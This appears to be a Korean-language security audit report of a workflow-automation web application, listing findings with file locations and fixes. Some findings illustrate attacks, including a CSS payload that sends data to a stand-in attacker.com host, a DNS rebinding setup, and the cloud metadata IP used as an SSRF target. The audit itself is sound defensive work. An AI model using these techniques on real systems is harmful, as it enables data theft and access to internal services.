### 발견사항

---

- **[WARNING]** WebSocket 게이트웨이의 CORS 와일드카드 허용
  - 위치: `backend/src/modules/websocket/websocket.gateway.ts:52`
  - 상세: `@WebSocketGateway({ cors: { origin: '*', credentials: true } })` — 와일드카드 origin 과 `credentials: true` 의 조합은 RFC 상 브라우저가 정상적으로 거부하지만, Socket.IO 서버 사이드에서는 모든 origin 연결을 수락한다. 이 설정은 JWT 토큰을 `auth.token` 핸드쉐이크로 받기 때문에 쿠키 기반 CSRF 위험은 낮다. 그러나 ws:// 연결을 허용하거나 토큰 없이 연결되면 `handleConnection` 이 disconnect 하기 전까지 TCP 세션이 열린다. 악의적 웹 페이지가 임의 origin 으로 소켓 연결을 맺고 rate-limit 소비나 채널 정찰을 시도할 수 있다.
  - 제안: `app.frontendUrl` 환경변수를 재사용하여 HTTP CORS 와 동일하게 `origin: configService.get('app.frontendUrl')` 으로 제한. 개발 환경에서는 `*` 허용 분기를 두되 `NODE_ENV=production` 에서 강제 제한.

---

- **[WARNING]** 웹훅 HMAC `hmacAlgorithm` 필드에 알고리즘 허용 목록 없음
  - 위치: `backend/src/modules/hooks/hooks.service.ts:144`, `backend/src/modules/triggers/dto/create-trigger.dto.ts:61`
  - 상세: `CreateTriggerDto.config` 는 `Record<string, unknown>` 으로 자유 형식이며 `hmacAlgorithm` 필드에 대한 허용 목록이 없다. 공격자가 editor 역할 이상 권한을 얻어 트리거를 생성할 때 `hmacAlgorithm: "hmac-md5"` 같이 취약한 알고리즘을 강제하거나, `Node.js crypto.createHmac()` 가 허용하는 임의 문자열을 전달할 수 있다. 현재 코드는 `config.hmacAlgorithm ?? 'sha256'` 로 기본값을 보호하지만 명시적 설정이 검증되지 않는다.
  - 제안: 트리거 저장 로직(service 또는 엔티티 변환 계층)에서 `hmacAlgorithm` 을 `['sha256', 'sha512']` 같은 허용 목록으로 제한. 또는 `config` 가 서비스 레이어로 들어오는 지점에서 zod/class-validator 로 `@IsIn(['sha256', 'sha512'])` 검증 추가.

---

- **[WARNING]** DOMPurify 허용 속성 `style` 이 CSS 인젝션 벡터를 열어 둠
  - 위치: `frontend/src/components/editor/run-results/renderers/presentation-renderers.tsx:45`
  - 상세: `SANITIZE_CONFIG.ALLOWED_ATTR` 에 `"style"` 이 포함되어 있다. DOMPurify 는 기본적으로 `style` 내 `javascript:` URI 와 `expression()` 은 차단하지만, CSS 클릭재킹 기법(`position: fixed; top: 0; left: 0; width: 100vw; ...`)이나 데이터 유출 기법(`background-image: url('https://attacker.com/?data=...')`) 은 허용한다. 워크플로우 실행 결과를 렌더링할 때 AI LLM 의 출력 또는 외부 API 응답에서 온 HTML 이 이 경로를 통과하면 CSS 기반 사이드채널 공격이 가능하다.
  - 제안: `style` 속성을 허용 목록에서 제거하고 CSS 표현을 `class` 기반으로 대체. 부득이하게 인라인 스타일이 필요하면 `DOMPurify.addHook('afterSanitizeAttributes', ...)` 를 사용하여 CSS 속성 단위 허용 목록 적용.

---

- **[WARNING]** HTTP Request 노드 SSRF 방어: DNS rebinding 2차 공격 미차단 (문서화된 잔여 위험)
  - 위치: `backend/src/nodes/integration/http-request/http-safety.ts:8-12`
  - 상세: `assertSafeOutboundUrl` 은 hostname 리터럴만 검사하고 DNS 해석 후 IP 재검사를 하지 않는다고 코드 주석에 명시되어 있다. 공격자가 TTL 을 매우 짧게 설정한 DNS 레코드(`attacker.com → 198.51.100.1 TTL 1s`)를 만들고, 첫 번째 요청에서 외부 IP 로 검증을 통과시킨 뒤 실제 fetch 시점에 `10.0.0.1` 로 전환하는 DNS rebinding 이 가능하다. 단, 이를 악용하려면 워크플로우 editor 권한 + 외부 DNS 제어가 모두 필요하다. `llm-preview.service.ts` 의 `resolvesToPrivate` 는 DNS 해석을 하지만 HTTP Request 핸들러에는 적용되지 않는다.
  - 제안: `assertSafeOutboundUrl` 호출 이후 `dns.lookup` 으로 해석된 IP 를 `isPrivateHost` 재검사. 또는 egress 방화벽 레벨에서 내부 IP 대역으로의 아웃바운드를 차단(네트워크 레이어 보완이 현실적으로 더 강력).

---

- **[WARNING]** Database Query 노드 — 사용자 제공 DB 호스트에 SSRF 검증 없음
  - 위치: `backend/src/nodes/integration/database-query/database-query.handler.ts:333`
  - 상세: `creds.host` 는 외부 통합(Integration) 엔티티에서 가져온 값으로 연결 풀 생성에 그대로 사용된다. 워크스페이스 owner 가 악의적으로 `host: "169.254.169.254"` (클라우드 메타데이터 IP) 나 `host: "postgres.internal"` 등을 통합에 등록하면 서버가 해당 IP 로 TCP 연결을 시도한다. HTTP Request 노드와 달리 SSRF 방어 코드가 전혀 없다.
  - 제안: 통합 자격증명 저장 시점 또는 핸들러 실행 시점에 `isPrivateHost` + `resolvesToPrivate` 로 `host` 를 검증. `port` 도 DB 표준 포트(5432, 3306) 화이트리스트 또는 1024 이상 범위로 제한.

---

- **[WARNING]** `protobufjs <=7.5.5` 의존성에 알려진 CVE 5건 (high severity)
  - 위치: `backend/package.json` 의존성 체인 (`@google/genai@1.50.1`, `@opentelemetry/*`)
  - 상세: `npm audit` 결과 protobufjs 7.5.5 에 GHSA-66ff-xgx4-vchm (코드 인젝션), GHSA-2pr8-phx7-x9h3 (DoS), GHSA-fx83-v9x8-x52w (프로토타입 인젝션), GHSA-75px-5xx7-5xc7, GHSA-jvwf-75h9-cwgg 등 5건의 high severity CVE 가 존재한다. `@google/genai` 가 직접 의존하는 경로가 가장 위험하며, OpenTelemetry 경로는 서버 내부 gRPC 전용이므로 공격면이 제한적이다.
  - 제안: `npm audit fix` 실행. `@google/genai` 최신 버전 업데이트로 protobufjs 의존성을 7.5.6+ 로 올리거나, 패키지 수준 override `"overrides": { "protobufjs": "^7.5.6" }` 를 `package.json` 에 추가.

---

- **[INFO]** bcrypt 라운드 12 사용 — 현재 수준은 적절하나 향후 검토 필요
  - 위치: `backend/src/modules/auth/auth.service.ts:25`, `backend/src/modules/users/users.controller.ts`
  - 상세: `BCRYPT_ROUNDS = 12` 는 현재(2026년) 기준 충분한 cost factor 이지만, 하드웨어 발전에 따라 주기적으로 상향 검토가 필요하다. 또한 상수가 여러 파일(`auth.service.ts`, `users.controller.ts`)에 분산되어 있어 일관성 유지가 어렵다.
  - 제안: `BCRYPT_ROUNDS` 상수를 `backend/src/common/config/auth.constants.ts` 단일 파일로 통합하고 주기적 검토 일정을 문서화.

---

- **[INFO]** 쿠키 `sameSite: 'none'` 은 `secure: true` 와 함께 사용됨 — 크로스사이트 시나리오 인지 필요
  - 위치: `backend/src/modules/auth/auth.controller.ts:523`
  - 상세: Refresh Token 쿠키가 `sameSite: 'none', secure: true` 로 설정된다. 이는 프론트엔드와 백엔드가 다른 도메인에 있는 경우 의도된 설정이다. 그러나 `sameSite: 'none'` 은 쿠키가 크로스사이트 요청에 자동 포함되므로, CSRF 방어는 전적으로 `httpOnly` 속성과 Bearer 토큰 기반 인증에 의존한다. 현재 구조상 CSRF 실질 위험은 낮으나 도메인 구성 변경 시 재검토 필요.
  - 제안: 프론트엔드/백엔드가 동일 eTLD+1 에 배포 가능하다면 `sameSite: 'lax'` 로 강화. 현재처럼 cross-origin 구성이 필수라면 CSRF 토큰 헤더 추가 검토.

---

- **[INFO]** `.env` 파일이 git 추적에서 제외됨을 확인 — 시크릿 코드베이스 노출 없음
  - 위치: `.gitignore:# env / .env`
  - 상세: `.env`, `backend/.env`, `frontend/.env` 모두 git 추적 대상에서 제외되어 있으며, `git ls-files` 로 확인한 결과 추적되지 않는다. `.env.example` 은 플레이스홀더(`change-me-*`) 만 포함하고 있어 실제 시크릿 노출 없음.
  - 제안: 현행 유지. CI/CD 파이프라인에서 `git-secrets` 또는 `trufflehog` 사전 커밋 훅을 추가하면 향후 실수에 의한 시크릿 노출을 조기에 차단할 수 있다.

---

- **[INFO]** `RolesGuard` 가 `@Roles()` 없는 라우트를 자동 통과(default-allow)함
  - 위치: `backend/src/common/guards/roles.guard.ts:51-53`
  - 상세: `requiredRoles` 가 없으면 역할 검사 없이 통과한다. 이는 의도된 설계이며 JwtAuthGuard 가 선행 인증을 보장하므로 인증되지 않은 접근은 불가하다. 단, 새 컨트롤러 추가 시 `@Roles()` 데코레이터를 잊으면 역할 검사가 묵시적으로 건너뛰어진다.
  - 제안: 새 컨트롤러 코드 리뷰 시 체크리스트에 "@Roles 명시 여부" 항목 추가. viewer 이상으로 기본 제한하고 싶은 경우 Guard 에 `defaultRequired: ['viewer']` 옵션을 두거나, 컨트롤러 클래스 레벨에 `@Roles('viewer')` 를 기본으로 설정하는 컨벤션 수립을 고려.

---

- **[INFO]** expression-engine 은 AST tree-walk 방식으로 `eval` / `new Function` 미사용 — 인젝션 위험 없음
  - 위치: `packages/expression-engine/src/evaluator.ts`
  - 상세: expression-engine 은 자체 파서로 AST 를 생성하고 tree-walk 방식으로 평가한다. `eval()`, `new Function()`, `child_process` 를 전혀 사용하지 않는다. 함수 호출은 허용 목록(`getFunction`, `hasFunction`)으로만 가능하며, 타임아웃(100ms)과 최대 깊이(100) 가드가 있다. 프로토타입 오염도 `__proto__`, `constructor` 키워드가 AST Identifier 레벨에서 허용 목록 밖이다.
  - 제안: 현행 유지. 허용 함수 목록(`functions/index.ts`)에 새 함수 추가 시 사이드 이펙트(파일시스템, 네트워크 호출) 없음을 코드 리뷰에서 확인.

---

- **[INFO]** 에러 응답에서 민감 정보 노출 방지 구현 확인됨
  - 위치: `backend/src/common/filters/http-exception.filter.ts`, `backend/src/common/utils/mask-sensitive-fields.util.ts`
  - 상세: GlobalExceptionFilter 는 스택 트레이스를 응답 바디에 포함하지 않으며, 예외 메시지를 일반화한다. DB 오류(`QueryFailedError`) 는 `RESOURCE_CONFLICT` 로만 노출된다. `maskSensitiveFields` 유틸리티는 로깅 전 apiKey, password, token, secret 등 민감 키를 마스킹한다.
  - 제안: 현행 유지. `maskSensitiveFields` 의 `DEFAULT_SENSITIVE_KEYS` 에 `credentials`, `private_key`, `encryption_key` 등을 추가로 고려.

---

- **[INFO]** Cafe24 OAuth HMAC 검증 및 replay 방지 구현이 적절함
  - 위치: `backend/src/modules/integrations/integration-oauth.service.ts:1210-1335`, `backend/src/modules/integrations/cafe24-install-nonce-cache.service.ts`
  - 상세: timestamp ±5분 윈도우 검사(DoS 저항) → install_token DB 조회 → timing-safe HMAC 비교(`timingSafeEqual`) 순서로 처리되며, Redis nonce cache 로 replay 공격을 추가 차단한다. HMAC 실패 시 `mall_id_mismatch`, `no_client_secret`, `hmac_verify_failed` 모두 동일한 `CAFE24_INSTALL_INVALID_HMAC` 코드로 응답해 정보 유출을 막는다. Redis 미설정 시 graceful degradation 은 잔여 위험이나 문서화되어 있다.
  - 제안: 운영 환경에서 Redis 설정 필수화 강제를 `NODE_ENV=production` 시 startup 검사로 추가 고려.

---

### 요약

전반적인 보안 수준은 중간-상(MEDIUM-HIGH)으로 평가된다. 인증 체계(JWT + bcrypt 12라운드 + refresh token rotation + reuse detection), 입력 검증(whitelist+forbidNonWhitelisted ValidationPipe), 에러 정보 은폐(GlobalExceptionFilter), 시크릿 마스킹, Cafe24 HMAC replay 방지, expression-engine 샌드박스, HTTP Request SSRF IP 리터럴 차단, DOMPurify XSS 방지 등 핵심 보안 계층이 의식적으로 구현되어 있다. 다만 세 가지 중요 갭이 존재한다: (1) Database Query 노드에 SSRF 방어가 없어 내부 DB 서버로의 피벗 공격이 가능하고, (2) WebSocket CORS 가 와일드카드(`*`)로 열려 있으며, (3) `protobufjs <=7.5.5` 에 5건의 high CVE 가 존재한다. DNS rebinding 과 webhook HMAC 알고리즘 미검증도 조건부 악용 가능한 경로다. 병렬 작업으로 인한 일관성 드리프트는 HTTP 핸들러에 SSRF 검증을 추가했으나 DB 핸들러에는 누락된 점에서 실제로 발생한 것으로 보인다.

### 위험도

HIGH
